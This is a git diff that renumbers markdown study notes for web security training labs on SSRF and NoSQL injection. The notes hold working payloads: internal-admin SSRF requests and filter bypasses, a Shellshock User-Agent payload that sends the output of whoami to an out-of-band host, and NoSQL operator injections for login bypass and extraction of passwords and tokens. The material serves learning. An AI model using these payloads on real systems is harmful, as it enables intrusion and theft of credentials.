@@ -1201,48 +1201,48 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
 - Logging and Monitoring: Implement logging and monitoring to detect suspicious activity.   
 
 ### SSRF Lab
-- Basic SSRF against the **local server**
-  - check stock
-    POST /product/stock   
-    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
-  - change the stockApi url
-    stockApi=`http://localhost/admin/delete?username=carlos`
-- Basic SSRF against **another back-end system**
-  - check stock
-    POST /product/stock   
-    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
-  - send to intruder > payloads number 1 to 255
-    stockApi=http://192.168.0.**§1§**:8080/admin   
-  - Found 200 response for port 47 > delete user
-    stockApi=http://192.168.0.**47**:8080/admin/delete?username=carlos  
-- SSRF with **blacklist-based** input filter
-  - Bypass blocking of http://127.0.0.1/, 'admin'
-  - `http://127.1/` OK
-  - double url encoding of 'admin' `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
-- SSRF with **whitelist-based** input filter
-  - http://127.0.0.1/ >  "External stock check host must be stock.weliketoshop.net"
-  - http://**user**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > embed credential accepted
-  - http://**user#**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > # accepted
-  - http://localhost%2523@stock.weliketoshop.net > double encode '#' accepted
-  - http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos > delete user   
-- SSRF with filter bypass via **open redirection** vulnerability
-  - Next product traffic: GET /product/nextProduct?currentProductId=1&path=/product?productId=2
-  - Check stock traffic: POST /product/stock stockApi=/product/stock/check?productId=1&storeId=2
-  - stockApi=/product/nextProduct?currentProductId=1&`path=http://192.168.0.12:8080/admin/delete?username=carlos` (Ctrl U encode)   
-- Blind SSRF with **out-of-band** detection
-  - Referer: https://0ac500a803221534816908d700410028.web-security-academy.net/
-  - `Referer: http://pf84dopkq16zh0dq128f4xvqiho8c10q.oastify.com`
-  - Copy collaborator and replace the referrer url > Goback Collaborator > click Poll now   > DNS records are showing
-- Blind SSRF with **Shellshock** exploitation
-  - Install Burp Extension '**Collaborator Everywhere**'
-  - Add the target site to scope so that Collaborator Everywhere will target it
-  - Navigate the site
-  - Under 'Issues' panel, collaborator Pingback (HTTP): User-Agent > click on the requeest > send to intruder
-  - Copy collaborator domain   
-  - Replace user agent string > `() { :; }; /usr/bin/nslookup $(whoami).jm9ykiwexvdtoukk8wf9br2kpbv2jw7l.oastify.com`
-  - Replace referrer: http://192.168.0.§1§:8080
-  - Payloads 1 - 255
-  - Poll now > The Collaborator server received a DNS lookup of type A for the domain name **peter-JsfgSS**.jm9ykiwexvdtoukk8wf9br2kpbv2jw7l.oastify.com.   
+1. Basic SSRF against the **local server**
+   - check stock
+     POST /product/stock   
+     stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+   - change the stockApi url
+     stockApi=`http://localhost/admin/delete?username=carlos`
+2. Basic SSRF against **another back-end system**
+   - check stock
+     POST /product/stock   
+     stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+   - send to intruder > payloads number 1 to 255
+     stockApi=http://192.168.0.**§1§**:8080/admin   
+   - Found 200 response for port 47 > delete user
+     stockApi=http://192.168.0.**47**:8080/admin/delete?username=carlos  
+3. SSRF with **blacklist-based** input filter
+   - Bypass blocking of http://127.0.0.1/, 'admin'
+   - `http://127.1/` OK
+   - double url encoding of 'admin' `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
+4. SSRF with **whitelist-based** input filter
+   - http://127.0.0.1/ >  "External stock check host must be stock.weliketoshop.net"
+   - http://**user**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > embed credential accepted
+   - http://**user#**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > # accepted
+   - http://localhost%2523@stock.weliketoshop.net > double encode '#' accepted
+   - http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos > delete user   
+5. SSRF with filter bypass via **open redirection** vulnerability
+   - Next product traffic: GET /product/nextProduct?currentProductId=1&path=/product?productId=2
+   - Check stock traffic: POST /product/stock stockApi=/product/stock/check?productId=1&storeId=2
+   - stockApi=/product/nextProduct?currentProductId=1&`path=http://192.168.0.12:8080/admin/delete?username=carlos` (Ctrl U encode)   
+6. Blind SSRF with **out-of-band** detection
+   - Referer: https://0ac500a803221534816908d700410028.web-security-academy.net/
+   - `Referer: http://pf84dopkq16zh0dq128f4xvqiho8c10q.oastify.com`
+   - Copy collaborator and replace the referrer url > Goback Collaborator > click Poll now   > DNS records are showing
+7. Blind SSRF with **Shellshock** exploitation
+   - Install Burp Extension '**Collaborator Everywhere**'
+   - Add the target site to scope so that Collaborator Everywhere will target it
+   - Navigate the site
+   - Under 'Issues' panel, collaborator Pingback (HTTP): User-Agent > click on the requeest > send to intruder
+   - Copy collaborator domain   
+   - Replace user agent string > `() { :; }; /usr/bin/nslookup $(whoami).jm9ykiwexvdtoukk8wf9br2kpbv2jw7l.oastify.com`
+   - Replace referrer: http://192.168.0.§1§:8080
+   - Payloads 1 - 255
+   - Poll now > The Collaborator server received a DNS lookup of type A for the domain name **peter-JsfgSS**.jm9ykiwexvdtoukk8wf9br2kpbv2jw7l.oastify.com.   
 
 ## NoSQL Injection
 Impact: Bypass authentication or protection; Extract or edit data; DoS; Execute code   
@@ -1287,83 +1287,83 @@ Types: synxtax (break the NoSQL query syntax), operator (manipulate queries)
 - ORM/ODM framework
   
 ### NoSQL Injection Lab
-- **Detecting NoSQL injection**
-  - URL encode all payloads chrs
-  - Test for syntax error
-    - Syntax error: `'` > Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal
-    - Correct Syntax: `Gifts'+'`> no error
-  - Test for different response via Boolean condition
-    - false: `Gifts' && 0 && 'x` > no listing
-    - true: `Gifts' && 1 && 'x`> product listing
-  - Submit a always true condition
-    `Gifts'||1||'` > list out all products
-- Exploiting NoSQL operator injection to **bypass authentication**
-  - username not equal to nothing + actual password > login
-    "username": `{"$ne":""}`   
-    "password": "peter"   
-  - regex admin* + password not equal to nothing > login
-    "username": `{"$regex":"admin.*"}`   
-    "password": `{"$ne":""}`    
-- Exploiting NoSQL injection to **extract data**
-  - identify the password length
-    intruder > GET /user/lookup?user=`administrator' && this.password.length == '§1§`
-    sniper | payload 1: number 5-15   
-  - enumerate the password
-    intruder >  GET /user/lookup?user=`administrator' %26%26+this.password.length+%3d%3d+'§8§`
-    cluster bomb | payload 1: 0-7 | payload 2: a-z
-- Exploiting NoSQL operator injection to **extract unknown fields**
-  - Perform password reset for carlos function
-  - identify if a **$where** clause is being evaluated
-    - false > invalid username or password
-      ```
-      {
-        "username": "carlos",
-        "password": {
-          "$ne": "invalid"
-        },
-        "$where": "0"
-      }
-      ```
-    - true > account locked
+1. **Detecting NoSQL injection**
+   - URL encode all payloads chrs
+   - Test for syntax error
+     - Syntax error: `'` > Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal
+     - Correct Syntax: `Gifts'+'`> no error
+   - Test for different response via Boolean condition
+     - false: `Gifts' && 0 && 'x` > no listing
+     - true: `Gifts' && 1 && 'x`> product listing
+   - Submit a always true condition
+     `Gifts'||1||'` > list out all products
+2. Exploiting NoSQL operator injection to **bypass authentication**
+   - username not equal to nothing + actual password > login
+     "username": `{"$ne":""}`   
+     "password": "peter"   
+   - regex admin* + password not equal to nothing > login
+     "username": `{"$regex":"admin.*"}`   
+     "password": `{"$ne":""}`    
+3. Exploiting NoSQL injection to **extract data**
+   - identify the password length
+     intruder > GET /user/lookup?user=`administrator' && this.password.length == '§1§`
+     sniper | payload 1: number 5-15   
+   - enumerate the password
+     intruder >  GET /user/lookup?user=`administrator' %26%26+this.password.length+%3d%3d+'§8§`
+     cluster bomb | payload 1: 0-7 | payload 2: a-z
+4.  Exploiting NoSQL operator injection to **extract unknown fields**
+   - Perform password reset for carlos function
+   - identify if a **$where** clause is being evaluated
+     - false > invalid username or password
        ```
-      {
-        "username": "carlos",
-        "password": {
-          "$ne": "invalid"
-        },
-        "$where": "1"
-      }
-      ```
-  - **identify all the fields** on the user object
-    - intruder > $where":"Object.keys(this)[1].match('^.{}.*')"
-    ```
        {
-        "username": "carlos",
-        "password": {
-          "$ne": "invalid"
-        },
-        "$where": "Object.keys(this)[0].match('^.{§§}§§.*')"
+         "username": "carlos",
+         "password": {
+           "$ne": "invalid"
+         },
+         "$where": "0"
        }
-    ```
-    - cluster bomb | payload 1: Numbers 0-20 | payload 2: a-z, A-Z, and 0-9
-    - start attack > repeat the index 0, 1, 2, 3, ...
-    - Result: id, username, password, email, **changePwd**   
-  - **Retrieve token** value
-    - intruder > $where":"this.**YOURTOKENNAME**.match('^.{}.*')
-    ```
-    POST /login HTTP/2
-    {
+       ```
+     - true > account locked
+        ```
+       {
+         "username": "carlos",
+         "password": {
+           "$ne": "invalid"
+         },
+         "$where": "1"
+       }
+       ```
+   - **identify all the fields** on the user object
+     - intruder > $where":"Object.keys(this)[1].match('^.{}.*')"
+     ```
+        {
+         "username": "carlos",
+         "password": {
+           "$ne": "invalid"
+         },
+         "$where": "Object.keys(this)[0].match('^.{§§}§§.*')"
+        }
+     ```
+     - cluster bomb | payload 1: Numbers 0-20 | payload 2: a-z, A-Z, and 0-9
+     - start attack > repeat the index 0, 1, 2, 3, ...
+     - Result: id, username, password, email, **changePwd**   
+   - **Retrieve token** value
+     - intruder > $where":"this.**YOURTOKENNAME**.match('^.{}.*')
+     ```
+     POST /login HTTP/2
+     {
         "username": "carlos",
         "password": {
           "$ne": "invalid"
         },
         "$where": "this.changePwd.match('^.{§§}§§.*')"
-    }
-    ```
-    - cluster bomb | payload 1: Numbers 0-20 | payload 2: a-z, A-Z, and 0-9
-    - Result of token： 066ad5544cf9a375
-  - Get the new password page
-    - repeater > GET /forgot-password?YOURTOKENNAME=TOKENVALUE > Request in browser > Original session
+     }
+     ```
+     - cluster bomb | payload 1: Numbers 0-20 | payload 2: a-z, A-Z, and 0-9
+     - Result of token： 066ad5544cf9a375
+   - Get the new password page
+     - repeater > GET /forgot-password?YOURTOKENNAME=TOKENVALUE > Request in browser > Original session
 
 ## XXE Injection
 Interfere with an application's processing of XML to view files on the application server file system, and interact with any back-end or external system. Leveraging XXE to perform SSRF.
